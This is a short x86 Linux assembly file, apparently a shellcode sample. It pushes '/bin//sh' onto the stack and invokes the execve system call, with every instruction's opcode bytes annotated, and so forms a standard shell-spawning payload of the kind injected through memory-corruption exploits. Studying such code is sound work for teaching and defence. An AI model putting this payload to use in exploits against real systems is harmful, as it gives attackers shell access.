    .section .shcode, "ax", @progbits
    .globl _start
    .hidden _start
    .type _start, @function
_start:
    /* 31 d2          */  xor     %edx, %edx    /* edx = 0 */
    /* 52             */  push    %edx
    /* 68 2f 2f 73 68 */  push    $0x68732f2f
    /* 68 2f 62 69 6e */  push    $0x6e69622f
    /* 89 e3          */  mov     %esp, %ebx    /* ebx = "/bin//sh" */
    /* 52             */  push    %edx
    /* 53             */  push    %ebx
    /* 89 e1          */  mov     %esp, %ecx    /* ecx = [ebx, NULL] */
    /* 6a 0b          */  push    $0xb
    /* 58             */  pop     %eax          /* eax = 11 = __NR_execve */
    /* cd 80          */  int     $0x80         /* syscall(eax, ebx, ecx, edx) */

/* Mark the stack as not executable */
    .section .note.GNU-stack, "", @progbits
